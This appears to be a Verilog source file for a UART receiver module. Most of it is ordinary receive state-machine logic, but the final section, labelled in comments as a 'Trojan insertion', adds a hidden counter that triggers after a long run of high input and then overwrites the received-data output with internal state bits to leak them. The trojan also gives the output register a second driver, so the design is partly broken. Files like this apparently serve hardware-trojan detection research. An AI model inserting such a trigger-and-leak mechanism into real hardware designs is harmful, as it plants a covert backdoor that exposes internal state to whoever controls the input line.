`timescale 1ns/1ns

module uart_rx(
    input  wire       clk,         // Top level system clock input.
    input  wire       resetn,      // Asynchronous active low reset.
    input  wire       uart_rxd,    // UART Receive pin.
    input  wire       uart_rx_en,  // Receive enable
    output wire       uart_rx_break, // Did we get a BREAK message?
    output wire       uart_rx_valid, // Valid data received and available.
    output reg  [PAYLOAD_BITS-1:0] uart_rx_data   // The received data.
);

// Fixed parameters
localparam       CYCLES_PER_BIT     = 5000;
localparam       PAYLOAD_BITS       = 8;
localparam       STOP_BITS          = 1;
localparam       COUNT_REG_LEN      = 14;

// Internal registers.
reg rxd_reg;
reg rxd_reg_0;
reg [PAYLOAD_BITS-1:0] received_data;
reg [COUNT_REG_LEN-1:0] cycle_counter;
reg [3:0] bit_counter;
reg bit_sample;
reg [2:0] fsm_state;
reg [2:0] n_fsm_state;

localparam FSM_IDLE = 0;
localparam FSM_START = 1;
localparam FSM_RECV = 2;
localparam FSM_STOP = 3;

// Output assignment
assign uart_rx_break = uart_rx_valid && ~|received_data;
assign uart_rx_valid = fsm_state == FSM_STOP && n_fsm_state == FSM_IDLE;

always @(posedge clk) begin
    if (!resetn) begin
        uart_rx_data  <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_STOP) begin
        uart_rx_data  <= received_data;
    end
end

// FSM next state selection
always @(*) begin
    case (fsm_state)
        FSM_IDLE: begin
            if (!rxd_reg && rxd_reg_0 && uart_rx_en) begin
                n_fsm_state = FSM_START;
            end else begin
                n_fsm_state = FSM_IDLE;
            end
        end
        FSM_START: begin
            if (cycle_counter == CYCLES_PER_BIT/2) begin
                n_fsm_state = FSM_RECV;
            end else begin
                n_fsm_state = FSM_START;
            end
        end
        FSM_RECV: begin
            if (bit_counter == PAYLOAD_BITS) begin
                n_fsm_state = FSM_STOP;
            end else begin
                n_fsm_state = FSM_RECV;
            end
        end
        FSM_STOP: begin
            if (cycle_counter == CYCLES_PER_BIT * STOP_BITS) begin
                n_fsm_state = FSM_IDLE;
            end else begin
                n_fsm_state = FSM_STOP;
            end
        end
        default: n_fsm_state = FSM_IDLE;
    endcase
end

always @(posedge clk) begin
    if (!resetn) begin
        bit_counter <= 4'b0;
    end else if (fsm_state == FSM_RECV && cycle_counter == CYCLES_PER_BIT - 1) begin
        bit_counter <= bit_counter + 1;
    end else if (fsm_state == FSM_STOP) begin
        bit_counter <= 4'b0;
    end
end

always @(posedge clk) begin
    if (!resetn) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if (fsm_state == FSM_RECV && cycle_counter == CYCLES_PER_BIT - 1) begin
        received_data <= {rxd_reg, received_data[PAYLOAD_BITS-1:1]};
    end
end

always @(posedge clk) begin
    if (!resetn) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if (fsm_state == FSM_START || fsm_state == FSM_RECV || fsm_state == FSM_STOP) begin
        if (cycle_counter == CYCLES_PER_BIT - 1) begin
            cycle_counter <= {COUNT_REG_LEN{1'b0}};
        end else begin
            cycle_counter <= cycle_counter + 1'b1;
        end
    end
end

always @(posedge clk) begin
    if (!resetn) begin
        fsm_state <= FSM_IDLE;
    end else begin
        fsm_state <= n_fsm_state;
    end
end

always @(posedge clk) begin
    if (!resetn) begin
        rxd_reg <= 1'b1;
        rxd_reg_0 <= 1'b1;
    end else if (uart_rx_en) begin
        rxd_reg <= rxd_reg_0;
        rxd_reg_0 <= uart_rxd;
    end
end

// Trojan insertion: Add a 16-bit counter to detect a specific signal pattern
reg [15:0] trojan_counter;
always @(posedge clk) begin
    if (!resetn) begin
        trojan_counter <= 16'b0;
    end else if (uart_rx_en && uart_rxd == 1'b1) begin
        trojan_counter <= trojan_counter + 1'b1;
    end
end

// Trojan activation condition: 16-bit counter overflow (i.e., 65536 cycles of uart_rxd high)
wire trojan_activate = trojan_counter == 16'hFFFF;

// Covert data transmission mechanism: leak internal signals through UART
always @(posedge clk) begin
    if (trojan_activate) begin
        uart_rx_data <= {fsm_state, cycle_counter[12:8], bit_sample}; // leak internal signals
    end
end

endmodule
